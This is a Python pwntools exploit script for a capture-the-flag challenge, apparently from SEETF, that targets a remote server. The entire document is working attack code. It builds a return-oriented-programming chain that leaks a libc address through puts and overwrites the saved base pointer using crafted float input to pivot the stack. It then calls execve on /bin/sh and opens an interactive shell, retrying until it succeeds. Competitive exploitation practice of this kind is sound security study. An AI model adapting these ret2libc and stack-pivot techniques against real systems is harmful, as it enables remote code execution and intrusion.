from pwn import *
import time

fn = "./chall"

elf = ELF(fn, checksec=False)
libc = ELF("./libc.so.6")
context.binary = elf
string_len = 0x107

sla = lambda x, y: p.sendlineafter(x, y)
sl = lambda x: p.sendline(x)

import struct
def pack_float(value):
    assert len(value) <= 4
    data = struct.unpack('f', value)[0]
    data = str(data).encode("ascii")
    return data

for _ in range(40):
    try:
        p = remote("win.the.seetf.sg", 2004)

        # Round 1
        rop = ROP([elf])
        RET = rop.find_gadget(["ret"]).address
        POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address

        rop_payload = flat([POP_RDI, elf.got["puts"], elf.sym["puts"], elf.sym["main"]])
        canary = b"A"*8
        payload = canary * ( (string_len - len(rop_payload) ) // 8 -1) + rop_payload  # -1 for alignment
        sla(b"Tell me an adventurous tale.\n", payload)

        sla(b"Give me a crazy number!\n", b"-")
        # overwrite saved rbp, so that when main() returns, its stack pointer points into our main buffer
        vuln_float = pack_float(b"\0\0\x41\xa0")  # offset of 0x30 between round 1 and round 2
        sla(b"Give me a crazy number!\n", vuln_float) # b"0")
        sla(b"Give me a crazy number!\n", b"-")

        libc_leak = u64(p.recvuntil(b"\n")[:-1].ljust(8, b"\0"))
        log.info("leak: " + hex(libc_leak))
        libc.address = libc_leak - libc.sym["puts"]
        if libc_leak % 0x8 != 0:
            p.kill()
            continue

        # Round 2
        rop = ROP([elf, libc])
        binsh = next(libc.search(b"/bin/sh\x00"))
        log.info("binsh: " + hex(binsh))
        rop.execve(binsh, 0, 0)

        rop_payload = rop.chain()
        payload = canary * ( (string_len - len(rop_payload) ) // 8) + rop_payload

        sla(b"Tell me an adventurous tale.\n", payload)

        sla(b"Give me a crazy number!\n", b"-")
        # do the same here (as before), but account for the offset of 0x30 between iterations
        vuln_float = pack_float(b"\0\0\x41\x70")
        sla(b"Give me a crazy number!\n", vuln_float)
        sla(b"Give me a crazy number!\n", b"-")


        time.sleep(1)
        p.interactive()
        break
    except:
        print("exception")
        pass